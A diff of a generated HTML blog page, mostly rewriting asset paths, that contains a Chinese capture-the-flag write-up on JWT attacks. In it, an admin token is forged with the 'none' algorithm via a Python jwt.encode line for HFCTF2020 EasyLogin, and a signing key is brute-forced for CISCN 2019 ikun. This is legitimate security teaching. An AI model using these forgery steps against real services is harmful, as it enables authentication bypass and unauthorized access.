 <h4 id="复现环境："><a href="#复现环境：" class="headerlink" title="复现环境："></a>复现环境：</h4><p>[<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[HFCTF2020\]EasyLogin](https://links.jianshu.com/go?to=https%3A%2F%2Fbuuoj.cn%2Fchallenges%23%5BHFCTF2020%5DEasyLogin)">https://buuoj.cn/challenges#[HFCTF2020\]EasyLogin](https://links.jianshu.com/go?to=https%3A%2F%2Fbuuoj.cn%2Fchallenges%23%5BHFCTF2020%5DEasyLogin)</a><br><a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://www.ctfhub.com/%23/challenge">https://www.ctfhub.com/#/challenge</a></p>
 <h4 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h4><p>运行环境发现是一个登录页面，直接登录显示<code>Cannot read property &#39;split&#39; of undefined</code>，<strong>需要先注册再登陆。</strong><br>使用注册的普通账号登录，发现<code>get flag</code>按钮，点击提示<code>permission denied</code>，无权限，那么此题的方向应该是伪造成一个高权限账户。<br>截取登录包，发现两处可疑<code>authorization</code>校验字段，<code>Cookie</code>也存在<code>sses.aok</code>的校验</p>
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/1667899778186-b6a9fa71-efbe-4f8d-a1b8-5d5e096f4dca.png" srcset="/ProbiusOfficial/ProbiusOfficial.github.io/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/1667899778186-b6a9fa71-efbe-4f8d-a1b8-5d5e096f4dca.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>可以看到<code>xxx.yyy.zzz</code>的结构，解码可知为jwt</p>
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/1667899843564-133b73ed-452e-47eb-8a29-2ad42fbaaf93.png" srcset="/ProbiusOfficial/ProbiusOfficial.github.io/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/1667899843564-133b73ed-452e-47eb-8a29-2ad42fbaaf93.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>通过查看源码，发现&#x2F;static&#x2F;js&#x2F;app.js 页面存在提示</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">/**<br> *  或许该用 koa-static 来处理静态文件<br> *  路径该怎么配置？不管了先填个根目录XD<br> */<br></code></pre></td></tr></table></figure>
 
@@ -501,32 +501,32 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(jwt.encode(&#123;<span class="hljs-string">&quot;secretid&quot;</span>:<span class="hljs-number">0.1</span>,<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>&#125;,algorithm=<span class="hljs-string">&quot;none&quot;</span>,key=<span class="hljs-string">&quot;&quot;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br></code></pre></td></tr></table></figure>
 
 <p>把生成的值替换authorization的值就通过验证了</p>
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/1667900973813-aeafc668-6cc6-4b9c-b463-3d30067a05db.png" srcset="/ProbiusOfficial/ProbiusOfficial.github.io/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/1667900973813-aeafc668-6cc6-4b9c-b463-3d30067a05db.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>登入之后点击get flag，权限足够，获得flag</p>
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/1667900984656-9ad6c80f-1f9b-4476-b745-accfd26a5c2d.png" srcset="/ProbiusOfficial/ProbiusOfficial.github.io/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/1667900984656-9ad6c80f-1f9b-4476-b745-accfd26a5c2d.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <h3 id="CISCN-2019-华北赛区-Web-ikun"><a href="#CISCN-2019-华北赛区-Web-ikun" class="headerlink" title="CISCN 2019 华北赛区 Web - ikun"></a>CISCN 2019 华北赛区 Web - ikun</h3><h4 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h4><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p>
 <h4 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h4><p>当然这道题还涉及逻辑漏洞和python反序列化，我们在这只提一下JWT部分，详细的WP师傅们可以在网上找到。</p>
 <p>&#x2F;b1g_m4mber这个页面，提示只允许admin访问</p>
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/1667904382380-0852286f-3e43-4392-a634-d2e06fccb725.png" srcset="/ProbiusOfficial/ProbiusOfficial.github.io/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/1667904382380-0852286f-3e43-4392-a634-d2e06fccb725.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>既然提示要admin，那基本上跟cookie有关，查看一下cookie，发现是JWT</p>
 <p>解码可得：</p>
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/1667904433899-179df22b-189f-4163-9fdf-0405bab08f04.png" srcset="/ProbiusOfficial/ProbiusOfficial.github.io/img/loading.gif" lazyload alt="img"></p>
-<p>而这道题对于jwt的解法是爆破密钥，我们用到一个叫<a href="https://github.com/brendan-rius/c-jwt-cracker">jwt-cracker</a>的工具来爆破密钥。</p>
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/1667904433899-179df22b-189f-4163-9fdf-0405bab08f04.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>而这道题对于jwt的解法是爆破密钥，我们用到一个叫<a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker">jwt-cracker</a>的工具来爆破密钥。</p>
 <p>当然 之前提到的 JWT tool 也支持密钥爆破。</p>
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/1667904553790-eab830ae-f17a-4a29-9452-529e1bc6ed91.png" srcset="/ProbiusOfficial/ProbiusOfficial.github.io/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/1667904553790-eab830ae-f17a-4a29-9452-529e1bc6ed91.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>爆破出来密钥为1Kun，修改用户名为admin，修改token重放：</p>
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/1667904579739-cdd029cb-ae8a-441e-8526-fa78c736ab21.png" srcset="/ProbiusOfficial/ProbiusOfficial.github.io/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/1667904579739-cdd029cb-ae8a-441e-8526-fa78c736ab21.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>接下来就是python反序列化了：</p>
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/1667904603214-9d2949a7-2a36-4224-b800-b6422ec42084.png" srcset="/ProbiusOfficial/ProbiusOfficial.github.io/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/1667904603214-9d2949a7-2a36-4224-b800-b6422ec42084.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <h2 id="End"><a href="#End" class="headerlink" title="End"></a>End</h2><ul>
 <li>Tool:</li>
 </ul>
-<p><a href="https://github.com/ticarpi/jwt_tool">https://github.com/ticarpi/jwt_tool</a></p>
-<p><a href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ticarpi/jwt_tool">https://github.com/ticarpi/jwt_tool</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a></p>
 <ul>
 <li>Reference</li>
 </ul>
-<p><a href="https://github.com/ticarpi/jwt_tool/wiki">https://github.com/ticarpi/jwt_tool/wiki</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ticarpi/jwt_tool/wiki">https://github.com/ticarpi/jwt_tool/wiki</a></p>
 <p><a target="_blank" rel="noopener" href="https://saucer-man.com/information_security/377.html">https://saucer-man.com/information_security/377.html</a></p>
 <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9376#toc-0">https://xz.aliyun.com/t/9376#toc-0</a></p>
 
@@ -547,7 +547,7 @@
     
       <span class="category-chain">
         
-  <a href="/ProbiusOfficial/ProbiusOfficial.github.io/categories/CTF/" class="category-chain-item">CTF</a>
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
   
   
 
@@ -562,7 +562,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/ProbiusOfficial/ProbiusOfficial.github.io/tags/Web/">#Web</a>
+        <a href="/tags/Web/">#Web</a>
       
     </div>
   
@@ -575,7 +575,7 @@
   <div class="license-box my-3">
     <div class="license-title">
       <div>From Jwt To The XiangYunCup FunWeb</div>
-      <div>https://github.com/ProbiusOfficial/ProbiusOfficial.github.io/2022/11/20/From-Jwt-To-The-XiangYunCup-FunWeb/</div>
+      <div>https://blog.probius.xyz/2022/11/20/From-Jwt-To-The-XiangYunCup-FunWeb/</div>
     </div>
     <div class="license-meta">
       
@@ -619,7 +619,7 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/ProbiusOfficial/ProbiusOfficial.github.io/2022/11/29/Build-Your-Remote-Linux-Docker/" title="Build-Your-Remote-Linux-Docker">
+                      <a href="/2022/11/29/Build-Your-Remote-Linux-Docker/" title="Build-Your-Remote-Linux-Docker">
                         <i class="iconfont icon-arrowleft"></i>
                         <span class="hidden-mobile">Build-Your-Remote-Linux-Docker</span>
                         <span class="visible-mobile">上一篇</span>
@@ -808,8 +808,8 @@
 
 <script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
 <script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/ProbiusOfficial/ProbiusOfficial.github.io/js/events.js" ></script>
-<script  src="/ProbiusOfficial/ProbiusOfficial.github.io/js/plugins.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
 
 
   <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
@@ -831,7 +831,7 @@
 
 
   
-    <script  src="/ProbiusOfficial/ProbiusOfficial.github.io/js/img-lazyload.js" ></script>
+    <script  src="/js/img-lazyload.js" ></script>
   
 
 
@@ -930,7 +930,7 @@
 
   <script>Fluid.plugins.imageCaption();</script>
 
-  <script  src="/ProbiusOfficial/ProbiusOfficial.github.io/js/local-search.js" ></script>
+  <script  src="/js/local-search.js" ></script>
 
   <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
 
@@ -940,7 +940,7 @@
 
 <!-- 主题的启动项，将它保持在最底部 -->
 <!-- the boot of the theme, keep it at the bottom -->
-<script  src="/ProbiusOfficial/ProbiusOfficial.github.io/js/boot.js" ></script>
+<script  src="/js/boot.js" ></script>
 
 
   
